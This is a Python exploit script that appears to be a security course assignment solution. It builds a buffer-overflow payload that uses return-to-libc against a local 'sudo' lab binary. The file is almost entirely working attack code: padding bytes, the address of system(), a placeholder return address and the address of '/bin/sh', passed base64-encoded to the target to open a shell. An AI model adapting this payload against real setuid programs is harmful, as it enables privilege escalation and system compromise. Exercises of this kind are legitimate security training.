import os
import sys
import base64
import addresses


PATH_TO_SUDO = './sudo'


def get_arg() -> bytes:
    """
    This function returns the (pre-encoded) `password` argument to be sent to
    the `sudo` program.

    This data should cause the program to open a shell using the return-to-libc
    technique. Make sure to return a `bytes` object and not an `str` object.

    NOTES:
    1. Use `addresses.SYSTEM` to get the address of the `system` function
    2. Use `addresses.LIBC_BIN_SH` to get the address of the "/bin/sh" string

    WARNINGS:
    0. Don't delete this function or change it's name/parameters - we are going
       to test it directly in our tests, without running the main() function
       below.

    Returns:
         The bytes of the password argument.
    """
    addr_libc_system = addresses.address_to_bytes(addresses.SYSTEM)
    patched_ret_addr_libc_system = addresses.address_to_bytes(0x12345678)
    addr_libc_bin_sh = addresses.address_to_bytes(addresses.LIBC_BIN_SH)
    encoded_payload = ("A" * (0x8E - 11) + "B" * 4).encode('latin1') + addr_libc_system + patched_ret_addr_libc_system + addr_libc_bin_sh
    return encoded_payload


def main(argv):
    # WARNING: DON'T EDIT THIS FUNCTION!
    # NOTE: os.execl() accepts `bytes` as well as `str`, so we will use `bytes`.
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, base64.b64encode(get_arg()))


if __name__ == '__main__':
    main(sys.argv)
